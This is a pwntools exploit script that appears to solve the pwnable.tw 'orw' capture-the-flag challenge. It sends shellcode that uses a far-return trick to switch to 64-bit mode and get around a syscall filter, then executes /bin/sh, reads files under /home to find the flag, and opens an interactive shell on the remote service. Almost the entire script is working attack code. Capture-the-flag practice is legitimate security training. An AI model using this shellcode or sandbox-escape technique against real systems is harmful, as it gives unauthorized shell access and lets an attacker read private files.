#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./orw"

if sys.argv[1] == "l":
    io = process("./orw")
else:
    io = remote("chall.pwnable.tw", 10001)

if __name__ == "__main__":
    raw_input("DEBUG: ")
    escape = asm('''
            mov DWORD PTR [esp + 4], 0x33
            mov DWORD PTR [esp], 0x804a070
            retf
            ''')
    sc = asm('''
            xor eax, eax
            mov al, 0x3b
            xor esi, esi
            xor edx, edx
            mov edi, ecx
            add edi, 0x2f
            syscall
            ''')

    #  escape = asm('''
            #  push 0x33
            #  push 0x804a070
            #  retf
            #  ''')
    #  sc = asm('''
            #  xor eax, eax
            #  mov al, 0x3b
            #  xor esi, esi
            #  xor edx, edx
            #  mov edi, ecx
            #  add edi, 0x27
            #  syscall
            #  ''')
    io.sendafter("shellcode:", escape + '\x90' * 0x10 + sc + "/bin/sh\0")

    io.sendline("cat /home/*/* | strings| grep -i flag")
    print io.recv()

    io.interactive()
